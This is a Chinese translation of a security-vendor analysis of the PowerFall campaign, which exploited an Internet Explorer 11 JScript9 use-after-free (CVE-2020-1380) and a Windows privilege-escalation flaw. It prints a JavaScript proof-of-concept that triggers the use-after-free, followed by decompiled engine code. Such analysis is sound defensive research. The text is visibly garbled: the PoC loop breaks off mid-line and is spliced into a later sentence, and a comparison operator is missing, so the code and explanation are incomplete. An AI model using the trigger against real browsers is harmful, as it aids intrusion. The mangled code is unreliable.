# PowerFall恶意活动：IE和Windows的两个0-day漏洞分析
##### 译文声明
本文是翻译文章，文章原作者 Boris Larin，文章来源：Security List
原文地址：
译文仅供参考，具体内容表达以及含义原文为准。
## 0x00 概述
2020年5月，卡巴斯基成功防御了Internet
Explorer恶意脚本对某家韩国企业的攻击。经过进一步分析发现，该工具使用了以前未知的完整利用链，其中包括两个0-day漏洞：Internet
Explorer远程代码执行漏洞、Windows特权提升漏洞。与我们以前在WizardOpium恶意活动中发现的攻击链不同，新的攻击链可以针对Windows
10的最新版本发动攻击。经过测试表明，该漏洞可以可靠地在Internet Explorer 11和Windows 10 x64的18363版本上利用。  
2020年6月8日，我们向Microsoft报告了我们的发现，并且Microsoft已确认漏洞。在我们撰写报告时，Microsoft的安全团队已经针对CVE-2020-0986漏洞发布了补丁，修复这一特权提升0-day漏洞。但是，在我们发现该漏洞之前，这一漏洞的可利用性被评估为“不太可能”。CVE-2020-0986的修复程序在2020年6月9日发布。  
Microsoft为JScript的Use-After-Free漏洞分配了CVE-2020-1380编号，该漏洞的补丁于2020年8月11日发布。
我们将这一系列攻击称为PowerFall恶意活动。目前，我们暂时不能将恶意活动与任何已知的威胁行为者建立明确联系，但根据它与以前发现漏洞的相似性，我们认为DarkHotel可能是此次攻击的幕后黑手。卡巴斯基产品目前将PowerFall攻击检测为“PDM:Exploit.Win32.Generic”。
## 0x01 Internet Explorer 11远程代码执行漏洞
在野外发现的Internet
Explorer最新0-day攻击利用了旧版本JavaScript引擎`jscript.dll`中的漏洞CVE-2020-0674、CVE-2019-1429、CVE-2019-0676和CVE-2018-8653。其中，CVE-2020-1380是jscript9.dll中的一个漏洞，该漏洞自Internet
Explorer 9开始存在，因此Microsoft建议的缓解步骤（限制`jscript.dll`的使用）无法针对这个特定漏洞实现防护。  
CVE-2020-1380是一个释放后使用（Use-After-Free）漏洞，由于JIT优化过程中，JIT编译的代码中缺少必要的检查导致。下面展示了触发漏洞的PoC：
    function func(O, A, F, O2) {
        arguments.push = Array.prototype.push;
        O = 1;
        arguments.length = 0;
        arguments.push(O2);
        if (F == 1) {
            O = 2;
        }
        // execute abp.valueOf() and write by dangling pointer
        A[5] = O;
    };
    // prepare objects
    var an = new ArrayBuffer(0x8c);
    var fa = new Float32Array(an);
    // compile func
    func(1, fa, 1, {});
    for (var i = 0; i ::BaseTypedDirectSetItem()`。下面是这个函数的反编译代码：
    int Js::TypedArray::BaseTypedDirectSetItem(Js::TypedArray *this, unsigned int index, void *object, int reserved)
    {
        Js::JavascriptConversion::ToNumber(object, this->type->library->context);
        if ( LOBYTE(this->view[0]->unusable) )
            Js::JavascriptError::ThrowTypeError(this->type->library->context, 0x800A15E4, 0);
        if ( index count )
        {
            *(float *)&this->buffer[4 * index] = Js::JavascriptConversion::ToNumber(
                object,
                this->type->library->context);
        }
        return 1;
    }
    double Js::JavascriptConversion::ToNumber(void *object, struct Js::ScriptContext *context)
    {
        if ( (unsigned char)object & 1 )
            return (double)((int)object >> 1);
        if ( *(void **)object == VirtualTableInfo::Address[0] )